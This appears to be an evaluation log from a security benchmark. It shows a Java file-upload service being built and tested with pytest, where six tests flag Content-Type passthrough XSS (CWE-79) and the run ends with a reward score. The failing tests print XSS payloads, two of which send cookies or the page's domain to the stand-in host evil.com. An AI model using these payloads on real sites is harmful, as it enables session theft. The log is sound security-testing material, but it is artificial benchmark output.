@@ -1,0 +1,179 @@
+VSB_BUILD=pass
+[eval] 构建并启动被测服务
+[start] MySQL
+ * Starting MySQL database server mysqld
+   ...done.
+[start] mvn package
+[start] glauth (LDAP)
+[start] mailpit (SMTP mock)
+[start] mock OAuth provider
+[start] java -jar target/platform-1.0.0.jar (with RASP hook)
+[start] callback + ysoserial servers
+[start] waiting for service on :8080
+[start] ready (HTTP 404, 4x3s)
+[eval] 运行 pytest
+============================= test session starts ==============================
+platform linux -- Python 3.11.15, pytest-9.1.1, pluggy-1.6.0
+rootdir: /tests
+configfile: pyproject.toml
+collected 25 items
+
+test_func.py ..................                                          [ 72%]
+test_vuln.py FFFFFF.                                                     [100%]
+
+=================================== FAILURES ===================================
+__________ TestContentTypePassthrough.test_txt_with_html_content_type __________
+
+self = <test_vuln.TestContentTypePassthrough object at 0x723605b07e50>
+base_url = 'http://localhost:8080'
+
+    def test_txt_with_html_content_type(self, base_url):
+        """上传 .txt 文件但 Content-Type 设为 text/html — 最基础的透传攻击"""
+        html_payload = b"<html><body><script>alert(document.cookie)</script></body></html>"
+        ok, ct = self._upload_and_check_content_type(
+            "notes.txt", html_payload, "text/html"
+        )
+        if ok and "text/html" in ct:
+>           pytest.fail(
+                "[CWE-79] Content-Type透传XSS: 上传 .txt 文件时伪造 Content-Type 为 text/html，"
+                "下载响应头中 Content-Type 被设为 text/html，浏览器将以HTML渲染执行脚本"
+            )
+E           Failed: [CWE-79] Content-Type透传XSS: 上传 .txt 文件时伪造 Content-Type 为 text/html，下载响应头中 Content-Type 被设为 text/html，浏览器将以HTML渲染执行脚本
+
+test_vuln.py:71: Failed
+________ TestContentTypePassthrough.test_png_ext_with_html_content_type ________
+
+self = <test_vuln.TestContentTypePassthrough object at 0x723605b10490>
+base_url = 'http://localhost:8080'
+
+    def test_png_ext_with_html_content_type(self, base_url):
+        """上传 .png 扩展名文件但 Content-Type 设为 text/html"""
+        html_payload = b"<html><body><script>fetch('https://evil.com/steal?c='+document.cookie)</script></body></html>"
+        ok, ct = self._upload_and_check_content_type(
+            "image.png", html_payload, "text/html"
+        )
+        if ok and "text/html" in ct:
+>           pytest.fail(
+                "[CWE-79] Content-Type透传XSS: .png 扩展名文件以 text/html Content-Type 上传，"
+                "下载时浏览器以 HTML 解析，扩展名校验形同虚设"
+            )
+E           Failed: [CWE-79] Content-Type透传XSS: .png 扩展名文件以 text/html Content-Type 上传，下载时浏览器以 HTML 解析，扩展名校验形同虚设
+
+test_vuln.py:83: Failed
+__________ TestContentTypePassthrough.test_csv_with_html_content_type __________
+
+self = <test_vuln.TestContentTypePassthrough object at 0x723605b12a50>
+base_url = 'http://localhost:8080'
+
+    def test_csv_with_html_content_type(self, base_url):
+        """上传 .csv 文件但 Content-Type 设为 text/html"""
+        html_payload = b"<html><body><img src=x onerror='alert(1)'></body></html>"
+        ok, ct = self._upload_and_check_content_type(
+            "report.csv", html_payload, "text/html"
+        )
+        if ok and "text/html" in ct:
+>           pytest.fail(
+                "[CWE-79] Content-Type透传XSS: .csv 文件以 text/html Content-Type 上传成功，"
+                "下载时触发 HTML 渲染，可利用 onerror 事件执行 JS"
+            )
+E           Failed: [CWE-79] Content-Type透传XSS: .csv 文件以 text/html Content-Type 上传成功，下载时触发 HTML 渲染，可利用 onerror 事件执行 JS
+
+test_vuln.py:95: Failed
+_________ TestContentTypePassthrough.test_jpg_with_xhtml_content_type __________
+
+self = <test_vuln.TestContentTypePassthrough object at 0x723605b33ed0>
+base_url = 'http://localhost:8080'
+
+    def test_jpg_with_xhtml_content_type(self, base_url):
+        """上传 .jpg 文件但 Content-Type 设为 application/xhtml+xml"""
+        xhtml_payload = (
+            b'<?xml version="1.0"?>'
+            b'<html xmlns="http://www.w3.org/1999/xhtml">'
+            b'<body><script>alert(document.domain)</script></body></html>'
+        )
+        ok, ct = self._upload_and_check_content_type(
+            "photo.jpg", xhtml_payload, "application/xhtml+xml"
+        )
+        if ok and "xhtml" in ct:
+>           pytest.fail(
+                "[CWE-79] Content-Type透传XSS: .jpg 文件以 application/xhtml+xml 上传，"
+                "下载时浏览器按 XHTML 解析执行内嵌脚本"
+            )
+E           Failed: [CWE-79] Content-Type透传XSS: .jpg 文件以 application/xhtml+xml 上传，下载时浏览器按 XHTML 解析执行内嵌脚本
+
+test_vuln.py:111: Failed
+__________ TestContentTypePassthrough.test_txt_with_svg_content_type ___________
+
+self = <test_vuln.TestContentTypePassthrough object at 0x723605b1b110>
+base_url = 'http://localhost:8080'
+
+    def test_txt_with_svg_content_type(self, base_url):
+        """上传 .txt 文件但 Content-Type 设为 image/svg+xml（SVG 可执行脚本）"""
+        svg_payload = (
+            b'<?xml version="1.0"?>'
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b'<script>alert(document.cookie)</script></svg>'
+        )
+        ok, ct = self._upload_and_check_content_type(
+            "diagram.txt", svg_payload, "image/svg+xml"
+        )
+        if ok and "svg" in ct:
+>           pytest.fail(
+                "[CWE-79] Content-Type透传XSS: .txt 文件以 image/svg+xml 上传，"
+                "浏览器按 SVG 渲染时执行内嵌 <script> 标签"
+            )
+E           Failed: [CWE-79] Content-Type透传XSS: .txt 文件以 image/svg+xml 上传，浏览器按 SVG 渲染时执行内嵌 <script> 标签
+
+test_vuln.py:127: Failed
+________ TestContentTypePassthrough.test_pdf_ext_with_html_content_type ________
+
+self = <test_vuln.TestContentTypePassthrough object at 0x723605b1bc10>
+base_url = 'http://localhost:8080'
+
+    def test_pdf_ext_with_html_content_type(self, base_url):
+        """上传 .pdf 扩展名文件但 Content-Type 设为 text/html"""
+        html_payload = (
+            b"<html><head><meta charset='utf-8'></head>"
+            b"<body><script>new Image().src='https://evil.com/?d='+document.domain</script></body></html>"
+        )
+        ok, ct = self._upload_and_check_content_type(
+            "document.pdf", html_payload, "text/html"
+        )
+        if ok and "text/html" in ct:
+>           pytest.fail(
+                "[CWE-79] Content-Type透传XSS: .pdf 扩展名文件以 text/html 上传，"
+                "绕过了扩展名白名单校验，下载时被浏览器当作 HTML 页面渲染"
+            )
+E           Failed: [CWE-79] Content-Type透传XSS: .pdf 扩展名文件以 text/html 上传，绕过了扩展名白名单校验，下载时被浏览器当作 HTML 页面渲染
+
+test_vuln.py:142: Failed
+==================================== PASSES ====================================
+--- generated xml file: /tests/results/fbed5f2c74900b97648b309ceab93676.xml ----
+=========================== short test summary info ============================
+PASSED test_func.py::TestAuthLogin::test_login_user1
+PASSED test_func.py::TestAuthLogin::test_login_admin
+PASSED test_func.py::TestAuthLogin::test_login_invalid_password
+PASSED test_func.py::TestUserMe::test_get_current_user
+PASSED test_func.py::TestWorkspaces::test_create_workspace
+PASSED test_func.py::TestWorkspaces::test_list_workspaces
+PASSED test_func.py::TestWorkspaces::test_get_workspace_detail
+PASSED test_func.py::TestFileUpload::test_upload_jpeg
+PASSED test_func.py::TestFileUpload::test_upload_png
+PASSED test_func.py::TestFileUpload::test_upload_txt
+PASSED test_func.py::TestFileUpload::test_upload_empty_file_rejected
+PASSED test_func.py::TestFileDownload::test_download_uploaded_file
+PASSED test_func.py::TestFileDownload::test_download_not_found
+PASSED test_func.py::TestFileInfo::test_file_info
+PASSED test_func.py::TestFileList::test_list_workspace_files
+PASSED test_func.py::TestFileDelete::test_delete_file
+PASSED test_func.py::TestAdminFiles::test_admin_list_all_files
+PASSED test_func.py::TestAdminFiles::test_user_cannot_access_admin_files
+PASSED test_vuln.py::TestContentTypePassthrough::test_inline_disposition_enables_xss
+FAILED test_vuln.py::TestContentTypePassthrough::test_txt_with_html_content_type
+FAILED test_vuln.py::TestContentTypePassthrough::test_png_ext_with_html_content_type
+FAILED test_vuln.py::TestContentTypePassthrough::test_csv_with_html_content_type
+FAILED test_vuln.py::TestContentTypePassthrough::test_jpg_with_xhtml_content_type
+FAILED test_vuln.py::TestContentTypePassthrough::test_txt_with_svg_content_type
+FAILED test_vuln.py::TestContentTypePassthrough::test_pdf_ext_with_html_content_type
+========================= 6 failed, 19 passed in 2.03s =========================
+VSB functional=1 secure=0 reward=0 [secure: 6 failed]
